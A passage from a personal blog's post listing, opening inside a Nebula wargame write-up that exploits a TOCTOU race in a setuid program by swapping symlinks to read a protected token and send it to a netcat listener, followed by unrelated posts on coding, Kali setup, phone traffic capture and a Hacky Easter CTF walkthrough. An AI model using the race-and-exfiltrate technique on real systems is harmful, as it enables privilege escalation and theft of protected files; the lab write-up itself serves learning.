      <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Unable to read from file: %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">strerror(errno));</span>
      <span style="color: #f8f8f2">exit(EXIT_FAILURE);</span>
    <span style="color: #f8f8f2">}</span>

    <span style="color: #f8f8f2">write(fd,</span> <span style="color: #f8f8f2">buffer,</span> <span style="color: #f8f8f2">rc);</span>

    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;wrote file!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>

  <span style="color: #f8f8f2">}</span> <span style="color: #66d9ef">else</span> <span style="color: #f8f8f2">{</span>
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;You don&#39;t have access to %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">file);</span>
  <span style="color: #f8f8f2">}</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</p>

<p>Now this one take a bit of playing around to get it right. Basically what we are exploiting here is that the file gets checked and then gets used. The <code>access</code> call checks the permissions based on the actual user, not the guid user. The file open calls however will run as the guid user. So in between these two calls, we <em>could</em> modify the target file and get the program to read the right file.</p>

<p>So ideally we want to create a symlink to a file we own when the <code>access</code> call runs, then replace that symlink with one that points to the token file. This relies heavily on timing when to update the symlink. I had a play and this is the most reliable way I have found.</p>

<p>You will need two shells (both on nebula is fine but optional); call them termA and termB. So in termB startup a listening netcat on the relevant port</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level10@nebula:~$ nc -l 18211
</pre></div>
</p>

<p>in termA we create our symlink, then run the command along with a command to update the symlink</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">level10@nebula:/home/flag10$ touch /tmp/mytoken
level10@nebula:/home/flag10$ ln -fs /tmp/mytoken /tmp/getme
level10@nebula:/home/flag10$ ./flag10 /tmp/getme 192.168.0.8 <span style="color: #f8f8f2">&amp;</span> ln -fs /home/flag10/token /tmp/getme
[1] 7359
Connecting to 192.168.0.8:18211 .. level10@nebula:/home/flag10$ Connected!
Sending file .. wrote file!
</pre></div>
</p>

<p>Meanwhile, back in termB</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
level10@nebula:~$ ssh flag10@localhost

flag10@localhost&#39;s password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
</pre></div>
</p>

<p><a href="http://unlogic.co.uk/2014/07/02/cracking-nebula-part2/">Part 2 of Cracking Nebula</a></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/05/29/on-yagni-and-tefnar/">
        On YAGNI and TEFNAR
      </a>
    </h1>

    <span class="post-date">Thu, May 29, 2014</span>

    <p>You&rsquo;ve probably heard of <a href="https://en.wikipedia.org/wiki/You_Ain%27t_Gonna_Need_It">YAGNI</a>
but not of TEFNAR. To recap YAGNI stands for <strong>Y</strong>ou <strong>A</strong>in&rsquo;t <strong>G</strong>onna <strong>N</strong>eed <strong>I</strong>t and
refers to the development principle of that you shouldn&rsquo;t write a feature that no one has asked for
in the first place as it&rsquo;s probably never going to be needed. Instead wait until
it&rsquo;s a requirement and implement it then. This saves wasted effort and keeps the code base
clean and as small as possible.</p>

<p>TEFNAR stands for <strong>TE</strong>chnology <strong>F</strong>or <strong>N</strong>o <strong>A</strong>pparent <strong>R</strong>eason and is a term
my boss coined (AFAIK). It basically refers to any unnecessary technology that
doesn&rsquo;t really add any functionality to the product. Sure it might look nice, but
is there a reason that&rsquo;s there or does that?</p>

<p>From this you can probably also see that YAGNI applies <em>before</em> and TEFNAR for <em>after</em>
the implementation. So with the background information done let me explain why I am writing
about this. A few people might not like the idea of YAGI and think it&rsquo;s better to
add a feature and make a useful app than omit it. Well allow me to give you an example
from the real world.</p>

<p>A fellow dev here implemented a feature that showed graphs to the user. He added a
feature to animate the graph points from 0 to their actual value each time you
were shown a graph. A very pretty feature indeed, but it doesn&rsquo;t add anything to
the graph. The animation doesn&rsquo;t represent another bit of data or a sort of
progress bar, it&rsquo;s just eye candy. I argued that although it&rsquo;s pretty people will
tire of it after a while. Much like you tire of most little animations you have to sit
through when you just want the end result. I also argued it&rsquo;s unnecessary complexity
that adds to the risk of introducing bugs and also adds another thing for future devs
to debug. Granted, it didn&rsquo;t take him long to code up, but stay tuned, here comes the
lesson.</p>

<p>Fast forward a day and I get called over</p>

<blockquote>
<p>Hey Sven, fancy a Python puzzle?</p>
</blockquote>

<p>I took the bait and headed over.</p>

<blockquote>
<p>So in the interpreter <code>1.0 &lt; 1.0</code> is <code>False</code>, which is correct.
But now look at this *runs small python script*. See here, <code>1.0 &lt; 1.0 True</code>
How is that?</p>
</blockquote>

<p>I look at the code and notice he&rsquo;s got a loop that adds 0.1 to a variable and
compares that to 1.0. I chuckled.</p>

<blockquote>
<p>Yeah, that&rsquo;s a different kettle of fish. Floats aren&rsquo;t that accurate that you
can accumulate like that and expect it to be <em>exactly</em> 1.0. That&rsquo;s the issue.</p>
</blockquote>

<p>He looked a little confused. I explained to him about how floats are represented.
If you are interested you can read up on <a href="https://docs.python.org/2.7/tutorial/floatingpoint.html">floating point values in Python</a>.</p>

<p>To demonstrate I opened an interpreter and ran this:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #f8f8f2">a</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0.1</span>
<span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #f8f8f2">a</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">0.1</span>
<span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #f8f8f2">a</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">0.1</span>
<span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #f8f8f2">a</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">0.1</span>
<span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #f8f8f2">a</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">0.1</span>
<span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #f8f8f2">a</span>
<span style="color: #ae81ff">0.6</span>
<span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #f8f8f2">a</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">0.1</span>
<span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #f8f8f2">a</span> <span style="color: #f92672">+=</span> <span style="color: #ae81ff">0.1</span>
<span style="color: #f92672">&gt;&gt;&gt;</span> <span style="color: #f8f8f2">a</span>
<span style="color: #ae81ff">0.7999999999999999</span>
</pre></div>


<p>I suggested he try the same by incrementing the value by <code>0.2</code> and the error went away.
He looked a little dejected. I asked what this was for and sure enough, it&rsquo;s how he
animated his graphs, so some points were slightly higher than they should be.</p>

<p>So be careful when you add code for no other reason than &ldquo;it looks nice&rdquo; as it&rsquo;s
just another area where you can introduce bugs. In this case it was a pretty small
issue, but a different feature could affect a larger part of the program or
even other programs.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/05/27/fixing-kali-vm-after-dist-upgrade/">
        Fixing Kali VM after dist-upgrade
      </a>
    </h1>

    <span class="post-date">Tue, May 27, 2014</span>

    <p>I just did a <code>apt-get dist-upgrade</code> to bump up to Kali 1.0.7.
I&rsquo;ve got it running on VirtualBox, and after it booted back up all the
VBoxAddition features were gone and the keyboard and mouse in X no longer
worked. GRUB was fine however. Poking around the logs a little I discovered
some issues with the mouse driver. Perhaps that was it, but why?</p>

<p>Long story short it took quite a bit of digging, but I eventually managed
to fix it. First thing is that the <code>pcscd</code> group just <em>dissapeared</em>.
All the following commands assume you are root, otherwise
prefix them with <code>sudo</code>. So I ran</p>

<p><code>groupadd pcscd</code></p>

<p>to add the group back in. Then run</p>

<p><code>apt-get install linux-headers-$(uname -r)</code></p>

<p>This will take a little while. Once done run</p>

<p><code>/etc/init.d/vboxadd setup</code></p>

<p>And it will build the kernel modules for the additons. One more reboot
and you should be back to a working system with all the integration you
had before.</p>

<p>I have no idea why this happens, but hopefully this post will help you
should you have the same problem.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/05/26/london-hacker-olympics-2014/">
        London Hacker Olympics 2014
      </a>
    </h1>

    <span class="post-date">Mon, May 26, 2014</span>

    <p>I recently attended the <a href="http://thehackerolympics.com/">2014 London Hacker Olympics</a>
and had a blast. Amidst meeting some amazing people and having a lot of
fun, our team managed to get first (second actually, as it was 0 indexed) place,
but only because it went into over time (even though it wasn&rsquo;t a draw), but who&rsquo;s bitter,
right :). Either way, we won some awesome medals</p>

<p><a href="http://i.imgur.com/K4ftxMo.jpg">
<figure >
    
        <img src="http://i.imgur.com/K4ftxMo.jpg" />
    
    
</figure>
</a></p>

<p>Here&rsquo;s the score board at game close (we&rsquo;re Minor Zeta): <a href="http://i.imgur.com/ILD2eAn.jpg">
<figure >
    
        <img src="http://i.imgur.com/ILD2eAn.jpg" />
    
    
</figure>
</a></p>

<p>There was a lot of good competition and a lot of fluxuation on the scoreboard.
At times there wasn&rsquo;t much separating the top teams.
Here&rsquo;s some of them hard at work:</p>

<p><a href="http://i.imgur.com/q58o9LN.jpg">
<figure >
    
        <img src="http://i.imgur.com/q58o9LN.jpg" />
    
    
</figure>
</a></p>

<p>The challenges were well thought out and balanced for coders and non coders alike.
I&rsquo;ll be there at the next one, will you? If so, I hope to see you there.</p>

<p>Anyway it was great and I hope that a few of the people who I told about this URL
are going to be reading this.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/05/26/twitter-im-back-on-it/">
        Twitter - I&#39;m back on it
      </a>
    </h1>

    <span class="post-date">Mon, May 26, 2014</span>

    <p>Yeah yeah, I gave in. Find me on Twitter: <a href="https://twitter.com/breakmain">@breakmain</a></p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/05/16/capturing-traffic-from-your-smartphone/">
        Capturing smartphone traffic - Part 1
      </a>
    </h1>

    <span class="post-date">Fri, May 16, 2014</span>

    

<p>We all carry phones around that are connected to some of network at all times.
Unless you are the truly paranoid or battery saving type, then there will be periods
when your phone is dark.</p>

<p>But even so, I often wonder what my phone is transmitting when I&rsquo;m not using it,
or even when I am using it. So in this series I plan on doing some investigation
into what goes in and out of my phone.</p>

<p>In this post I&rsquo;ll just set up all the bits and pieces to start the monitoring
process and run a quick check to make sure everything works. In the following
parts I&rsquo;ll be taking a look at some common apps and their network chatter. The
idea is to analyse the data and understand their communications. Hopefully we&rsquo;ll
also unearth some interesting things along the way.</p>

<h2 id="what-we-ll-need:41796c2feda068943018a98e7c373755">What we&rsquo;ll need</h2>

<ul>
<li>A smartphone</li>
<li>A laptop (or similar) to turn into a wireless access point</li>
<li><a href="https://www.wireshark.org/">Wireshark</a> running on that laptop</li>
<li>An internet connection</li>
</ul>

<h2 id="setting-up-the-wireless-access-point:41796c2feda068943018a98e7c373755">Setting up the wireless access point</h2>

<p>I&rsquo;m going to cover how to do this part in OSX for now. If I get round
to it I&rsquo;ll add a Linux way to do it too.</p>

<h3 id="osx:41796c2feda068943018a98e7c373755">OSX</h3>

<p>First connect the laptop to an ethernet connection. You can&rsquo;t be connected to
a wireless network and create a wireless access point at the same time.
So we will connect to the internet via ethernet and use the wireless radio
for the access point. Once the ethernet connection is up and running, open
<em>System Preferences -&gt; Sharing</em>. In the list click on the <em>Internet sharing</em>
entry (not the check box) and select <em>Ethernet</em> in the <em>Share your connection
from</em> dropdown. In the <em>To computers using</em> select <em>Wi-Fi</em>. Now select the
check box next to <em>Internet Sharing</em> to turn sharing on.</p>

<p><a href="http://i.imgur.com/K2Zeyoy.png">
<figure >
    
        <img src="http://i.imgur.com/K2Zeyoy.png" />
    
    
</figure>
</a></p>

<p>If everything went to plan your Wi-Fi indicator should now look like this:</p>

<p><a href="http://i.imgur.com/ecXJUc8.png">
<figure >
    
        <img src="http://i.imgur.com/ecXJUc8.png" />
    
    
</figure>
</a></p>

<h2 id="connect-the-phone:41796c2feda068943018a98e7c373755">Connect the phone</h2>

<p>Now we connect tbe phone to the new access point. Go to your wireless network
settings and select the name of the network we created. <strong>slaptop</strong> in my case.
Once do we need to</p>

<h2 id="start-wireshark:41796c2feda068943018a98e7c373755">Start Wireshark</h2>

<p>Fireup Wireshark and then select the capture interface. The default will be
eth0 usually. That&rsquo;s the ethernet port, but we want to capture traffic on the
wireless access point. So we need to select <em>en1</em> (in my case). It&rsquo;s the one
with the wireless icon next to it.</p>

<p><a href="http://i.imgur.com/9wyI6s6.png">
<figure >
    
        <img src="http://i.imgur.com/9wyI6s6.png" />
    
    
</figure>
</a></p>

<p>Once this is done we&rsquo;ll want to filter out ARP packets as these are of little
interest and there will be quite a few of them. See the screenshot below to
see where to set this.</p>

<p>Now we press the <em>Capture</em> button to begin bapturing traffic. Once running we
can check to see if it&rsquo;s working by browsing to a site. I chose this site at
<code>192.30.252.153</code>. You should see the capture window scroll past with some
traffic going between your phone ip and the site your browsed to.</p>

<p><a href="http://i.imgur.com/XjFuoOQ.png">
<figure >
    
        <img src="http://i.imgur.com/XjFuoOQ.png" />
    
    
</figure>
</a></p>

<h2 id="in-the-next-post:41796c2feda068943018a98e7c373755">In the next post</h2>

<p>So I&rsquo;m all set to capture any and all traffic now that goes to and from my phone.
With this I can now open various apps and see what traffic they generate. In
the next posts I plan to see what idle traffic there is (no apps being actively
used) and what traffic some common apps generate. If I&rsquo;m lucky I might even
discover some interesting things about some apps.</p>

<p>Stay tuned for part 2.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2014/04/25/hackyeaster-all-eggs/">
        Hackyeaster All Eggs
      </a>
    </h1>

    <span class="post-date">Fri, Apr 25, 2014</span>

    

<p>I started writing these up as separate posts, but then I figured it&rsquo;d be neater to post them all in one.</p>

<p>So here you go, all the Hacky Easter eggs. Some answers will guide you directly to the eggs, others will
require a little bit of work to achieve it. But if you got stuck and are wondering where those missing eggs
are, I hope this guide will help you.</p>

<h1 id="egg-0x01-just-for-fun:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x01 - Just for fun</h1>

<p>The the first egg is fairly easy. There&rsquo;s two ways to approach this one, but ultimately we need
to stop that egg from spinning so we can scan it. I first thought it was a .gif file and so opened it
in a new tab so I can download it and open it in Gimp or something. Turns out it&rsquo;s a .png, so you can either
<em>Open Image in New Tab</em> or save it and view it from there to scan the QR code, or remove the CSS class
<em>eggImage pulse</em> from the <code>img</code> tag.</p>

<p>Scan the code and we&rsquo;re done.</p>

<h1 id="egg-0x02-dude-where-s-challenge-2:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x02 - Dude, where&rsquo;s challenge 2?!</h1>

<p>This egg is a little trickier to get, only because it involves making some mental
connections. First off we have no link, simply the title <em>Challenge 2: Dude, where&rsquo;s challenge 2? It should be after challenge 1.</em>
So where is it? First of all you&rsquo;ll want to do the most obvious thing, that is enter
<em><a href="http://hackyeaster.hacking-lab.com/hackyeaster/challenges/challenge-two.html">http://hackyeaster.hacking-lab.com/hackyeaster/challenges/challenge-two.html</a></em> in the address bar.</p>

<p>So we&rsquo;ve done that, we get a 404. Darn. Let&rsquo;s try <em><a href="http://hackyeaster.hacking-lab.com/hackyeaster/challenges/challenge_two.html">http://hackyeaster.hacking-lab.com/hackyeaster/challenges/challenge_two.html</a></em>.
Another 404. But something is a little weird. Take a look at the 404 from the previous try, it&rsquo;s in Icelandic (or so Chrome tells
us). We also notice that the <em>-two</em> in our incorrect URL is in red - this doesn&rsquo;t happen in the english 404 page.
So armed with this knowledge we can perhaps try the Icelandic word for two instead. Google translate tells us this is
<em>tveir</em>. Substituting this for <em>two</em> in our URL works. We have egg 0x02</p>

<h1 id="egg-0x03-whooo-whooo:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x03 - Whooo Whooo!</h1>

<p>This egg is found on the app. Once you open the challenge you will see a kid&rsquo;s drawing of
an owl and some random letters at the bottom.</p>

<p>Where have we seen letters like that before? Everywhere where you have URL shorteners really.
But which one could it be? Well the image gives us a clue: <a href="http://ow.ly">ow.ly</a></p>

<p>Collect the egg.</p>

<h1 id="egg-0x04-nothing-to-see-here:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x04 - Nothing to see here</h1>

<p>The page and image tells us that there&rsquo;s nothing to see here. Oh well, let&rsquo;s go back and forget about it.</p>

<p>No, let&rsquo;s not, let&rsquo;s just do the usual thing of looking at the page source. It&rsquo;s always a good
idea to poke around inside things to figure out how they work. Sometimes they might reveal some useful information.</p>

<p>And there it is&hellip; just below the <code>footer-wrapper</code> is our easter egg. Albeit in a little
less scannable format. Not to worry, let&rsquo;s figure this out. It looks like raw, base64 image data.
Two ways to approach this one too. Both achieve the same thing, that is to decode base64 data.</p>

<p>The simplest way to do it is to use an online tool like <a href="http://www.motobit.com/util/base64-decoder-encoder.asp">the motobit decoder</a>
. Simply paste the text into the field, select <strong>decode</strong> then <strong>export to a binary file</strong> and put whatever filename
you want with a <code>.png</code> extension. Then click <strong>Convert</strong> and your image will download.</p>

<p>Alternatively create a new HTML file and in the header add:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">body {
    background-image: url(&quot;data:image/png;base64,<span style="color: #f92672">&lt;base64</span> <span style="color: #a6e22e">data</span> <span style="color: #a6e22e">follows</span> <span style="color: #a6e22e">here</span><span style="color: #f92672">&gt;</span>&quot;);
}
</pre></div>


<p>making sure you add the <code>body</code> tags. View the page in your browser and scan one of the eggs.</p>

<h1 id="egg-0x05-pet-shop:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x05 - Pet Shop</h1>

<p>This is less of a brain teaser. You just need to find the QR code in the image.
You can do it by just looking at the image and seeing if you can spot it, or
start tweaking colour values and then brightness contrast. Eventually you will
reveal a QR code. I needed to re-trace some of it in order to get it to scan, but
it depends on how well you manage to isolate its colours.</p>

<h1 id="egg-0x06-australia:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x06 - Australia</h1>

<p>This challenge is in the phone application. Click on it and we get a picture of
Australia. We all know one thing about Australia. No, not that, the other thing.
That&rsquo;s right, they&rsquo;re all upside down. Turn your phone over and screencap the egg to
scan it with your app from your desktop.</p>

<h1 id="egg-0x07-e-gg-mail:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x07 - E(gg)-Mail</h1>

<p>This one had me too. I decoded the obvious base64 message, but then was stumped as
to how to extract the eggs. A friend of mine (the one with the windows box) managed to
open it in a <em>.msg</em> viewer and get the attachment that way. A <em>.msg</em> is an Outlook/MS mail
format. So a viewer to open the file is all that was needed to get the egg.</p>

<h1 id="egg-0x08-hidden:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x08 - <em>hidden</em></h1>

<p>This is a hidden egg. But where could it be hiding? Well, have you tried <em>searching</em> for it?</p>

<p>At the time of writing searching for <em>hackyeaster</em> in Google images shows you egg 0x08.
It&rsquo;s actually in the screen shots for the apps. So either go to the AppStore or Google Play
and look for the hacky easter app. Check the screen shots and you will find egg 0x08.</p>

<h1 id="egg-0x09-wise-rabbit:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x09 - Wise Rabbit</h1>

<p>The Wise Rabbit.. oh he&rsquo;s such a smug bastard. This is a really annoying one because
it&rsquo;s quite easy, but I had to spend quite some time thinking about it. This is where
those many hours spent playing text adventures pays off.</p>

<p>So what do we notice about this page? First off it tells us to check the green eggs.
First I skimmed the pages again, re-checked all the files and turned up with nothing.
&ldquo;Quick response&rdquo; - might this relate to the email challenge? Check again but nothing.</p>

<p>*Q*uick *R*esponse. QR. So let&rsquo;s just scan the green eggs again, but this time without
the app, but with a separate QR code reader. <strong>Beep</strong> sure enough, there seems to be
something there. Scan a few eggs and the pass phrase will reveal itself.</p>

<h1 id="egg-0x0a-hidden:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x0a - <em>hidden</em></h1>

<p>Another hidden one? I have to admit, these bugged me a lot, because you just had to
be nosey enough to find them, and they were quite tricky to find.</p>

<p>So the first clue is that the hidden eggs might be in the files provided, outside of
challenges. Where could that be. Well let&rsquo;s have a look at what files they give us. A PDF Flyer.
Let&rsquo;s have a look there. Nothing. Just a bunch of blank eggs. But wait, what&rsquo;s that just poking
out between those other eggs? Hrmm. Seems to be a little bit of barcode there. I wonder if
we can extract that egg somehow. I tried <a href="http://www.extractpdf.com/">extractpdf.com</a> and sure
enough, there&rsquo;s the egg for you to scan.</p>

<h1 id="egg-0x0b-i-frame-you-frame:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x0b - I frame, you frame</h1>

<p>Another app based one. Fire up the challenge and you have to press a button.
You press it and it tells you that it can&rsquo;t be viewed in a mobile browser.</p>

<p>So we need to figure out what URL is being accessed and enter that into a browser.
The easiest way is to connect to a proxy and look at the requests in order to determine
the URL.</p>

<p>I used OSX and Linux to solve the challenges, and there&rsquo;s a nice Squid frontend for
OSX called <a href="http://squidman.net/squidman/">Squidman</a>. Start it up and then
connect to it with your device. How you do that depends on whether you have an Android or
iPhone, but I am sure you can figure it out. Once connected view the Squid logs and
press the button. You should now see the URL <code>GET</code> request. Gran this URL and
paste it into your browser URL. Snap the pic and</p>

<h1 id="egg-0x0c-call-me:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x0c - Call Me!</h1>

<p>Call me? What do you mean? Who are you? Where are you? will this run up a massive
phone bill?</p>

<p>No it won&rsquo;t. Take a look at the image. There&rsquo;s a protocol specified there: <em>ps.hackyeaster://</em>
So enter that in your mobile browser (Chrome didn&rsquo;t work for me, but Firefox did) followed by the number.</p>

<p>Voila, egg 0x0C</p>

<h1 id="egg-0x0d-hidden:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x0d - <em>hidden</em></h1>

<p>Another hidden one&hellip;. <em>sigh</em>, at least it&rsquo;s the last one.
Well ok, let&rsquo;s have a look at some of the other supporting files.
We&rsquo;ve got the flyer already. Nothing else to download. Except perhaps&hellip;. Yes, the app itself.</p>

<p>If you have an iPhone I can&rsquo;t tell you how to do this, but with an android you need to
grab the application APK and unzip it, search for PNG images and one of those is the egg.</p>

<p>Phew - that&rsquo;s all the hidden eggs done with.</p>

<h1 id="egg-0x0e-bunny-research:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x0e - Bunny Research #</h1>

<p>A PDF with some plain text and some, what appears to be, encrypted text. Well clearly the
answer is in the encrypted text. But how do we decode it? Let&rsquo;s just read the text around it.
Mostly just big words and hot air. Well, given the format of the encypted text it looks like a
substitution cipher of some sort. Perhaps Caesar cipher? let&rsquo;s Google some substituion cipher
types&hellip;. <a href="https://en.wikipedia.org/wiki/Substitution_cipher">Wikipedia has a page on these ciphers</a>
and after reading a while we notice a word we only just saw <strong>Vigenère</strong>. Well that is a big clue.
Let&rsquo;s take a look at <a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher">how it works</a>. So
basically we need to work out the key from the text we have. How can we possibly do that?</p>

<p>Let&rsquo;s not be lazy and write or download some code that will translate between cipher text
and plain text for us. I used <a href="http://gurno.com/adam/vigen/">this Python script</a> to process the
text. So let&rsquo;s start analysing the text for something we might be able to identify. For me
it was the text <strong>XHV R* TYNEAP</strong>. Given it&rsquo;s a computer text I bet the plain text is <strong>the A* search</strong>.</p>

<p>In order to decipher the text and get the possible keyword we need to setup something like this:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">-----------------------------------------------------
| T | H | E |   | A | * |   | S | E | A | R | C | H |
-----------------------------------------------------
| X | H | V |   | R | * |   | T | Y | N | E | A | P |
=====================================================
|   |   |   |   |   |   |   |   |   |   |   |   |   |
-----------------------------------------------------
</pre></div>


<p>The top row is the plain text we expect, the second row is the cipher text and the bottom row
the key (or part of it). In order to get the key we reverse the lookup into the
vignere table. Look for the expected plaintext letter in the top row and go down
until you find the matching cipher letter. Then look across to find the key&rsquo;s letter.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">-----------------------------------------------------
| T | H | E |   | A | * |   | S | E | A | R | C | H |
-----------------------------------------------------
| X | H | V |   | R | * |   | T | Y | N | E | A | P |
=====================================================
| E | A | R |   | R | * |   | B | U | N | N | Y | I |
-----------------------------------------------------
</pre></div>


<p>We&rsquo;re getting something here, specifically <strong>BUNNYI</strong>. The <strong>THE</strong> looks like a wrong guess. Let&rsquo;s try
another possible 3 letter word:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">-------------
| F | O | R |
-------------
| X | H | V |
=============
| S | T | E |
-------------
</pre></div>


<p>This gives us <strong>EASTERBUNNY</strong> - <strong>much</strong> more likely to be correct. So let&rsquo;s copy out the text from the pdf
into a text file, modify the vigen script to open that instead and just enter what we have so far. One thing
you have to do is either modify the vigen script to skip non alpha chars, or remove them from the source text.</p>

<p>Our first try outputs: <em>THEINVESTIGAHDALITLV&hellip;.</em> So we know that we were lucky that our known text is the beginning
of the cipher key. As you can see the text is clearly <em>the investigation&hellip;</em>. Knowing this you can use the same approach
as above to solve the rest of the key. Once you&rsquo;ve deciphered the whole text, you get the pass code. Enter it into
the page to get your key.</p>

<h1 id="egg-0x0f-paper-chase:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x0f - Paper Chase</h1>

<p>This one already provides a big hint: Google maps.</p>

<p>So let&rsquo;s do a quick search to see if we can find the restaurant on line, get its address and take a look. It won&rsquo;t take long
to get the location of the restaurant, so open Google Earth and take a look. Lots of photos. None of them the one we want.
Clearly we can just search all the photos, but there&rsquo;s a smarter way. The image was taken somewhere right? So let&rsquo;s take
a peek at the EXIF data. There we go, location data. Enter the data into Google Earth and we go directly to a photo set.</p>

<p>And sure enough, there&rsquo;s the photo we are looking for. Click, zoom, ehance, scan.</p>

<h1 id="egg-0x10-broken-egg:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x10 - Broken Egg</h1>

<p>We&rsquo;re given two png files. One is a partial egg, the other one doesn&rsquo;t even show. One thing
I tend to do is always look at the files in hex if in doubt. The first egg looks normal. Let&rsquo;s take a look at
the second egg. Oh, there&rsquo;s some familiar data there at the end. Looks like that base 64 stuff we&rsquo;ve seen
before. Covert it and save it as a .png file. We get the right half of the egg. Weird. The partial in the second
pic is the top half.</p>

<p>Let&rsquo;s take a closer look at the first egg. Notice anything? The header is corrupt. Fix the problem, save
the file, and then use your favourite image editor to combine the two halves.</p>

<h1 id="egg-0x11-number-cracker:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x11 - Number Cracker</h1>

<p>We&rsquo;re told what to do, so let&rsquo;s do that</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">$&gt;</span> netcat hackyeaster.hacking-lab.com 1234
Enter your guess, dude:
123456789
I need <span style="color: #ae81ff">20</span> digits, dude!
</pre></div>


<p>Ok, so not enough digits, let&rsquo;s try 20</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">$&gt;</span> netcat hackyeaster.hacking-lab.com 1234
Enter your guess, dude:
12345678901234567890
0&lt;
</pre></div>


<p>Hrmm. What does that mean? Let&rsquo;s change the command a little to make reentering
the numbers easier</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">$&gt;</span> <span style="color: #f8f8f2">echo </span>12345678901234567890<span style="color: #f8f8f2">|</span> netcat hackyeaster.hacking-lab.com 1234
Enter your guess, dude:
0&lt;
</pre></div>


<p>Let&rsquo;s the edit the input from the first number.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">$&gt;</span> <span style="color: #f8f8f2">echo </span>22345678901234567890<span style="color: #f8f8f2">|</span> netcat hackyeaster.hacking-lab.com 1234
Enter your guess, dude:
1&lt;
</pre></div>


<p>Ahhh so it seems that the first digit tells us how many numbers are correct
from the start of the number. The <em>&lt;</em> tells us we&rsquo;re lower than we need to be.</p>

<p>So you have a choice, script it, or, if you are lazy like me, go through it
manually with a binary search for each digit. It took a few minutes for me
to do it manually (if that), probably about the same time as it would have
taken to write a script to do it. Sometimes it&rsquo;s just easier to not try to
automate it. Once done, you&rsquo;ll get your egg.</p>

<h1 id="egg-0x12-lost-in-transformation:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x12 - Lost in Transformation</h1>

<p>We&rsquo;ve got a wall of text here and our biggest clue is that the beginning of the text [100:b64]
<em>b64</em> most likely hints at base64 encoding, so let&rsquo;s give it a whirl. Copy everything but the bits
in the [] and decode.</p>

<p>Now we have <code>[99:inv][98:URL]</code>&hellip;. oh god. It looks like&hellip; yeah, it&rsquo;s been encoded 100 times
with a different method each time. We will have to script this. If you fancy the exercise you can
run a loop over the text and decode it with whatever method is specified in the []. Each time you come
across a new encoding method, add it to the list.</p>

<p>Alternatively view <a href="https://gist.github.com/Svenito/d28572d6c9a4c1a1b603#file-egg0x0e-py">my gist</a> of it here.</p>

<h1 id="egg-0x13-tap-the-xap:1f47b020cd2a2dab1c2f013883a84ef3">Egg 0x13 - Tap The Xap</h1>

<p>I hated this one. It was a pain. I thought that you had to run the xap to solve this, but I got lucky.
VERY lucky. So apparently xap files are just zip files so <code>unzip TapTheXap.xap</code> will extract all there is
inside the app. Unfortunately no egg.png - that&rsquo;d be too easy right? Where could it be? I got desperate and
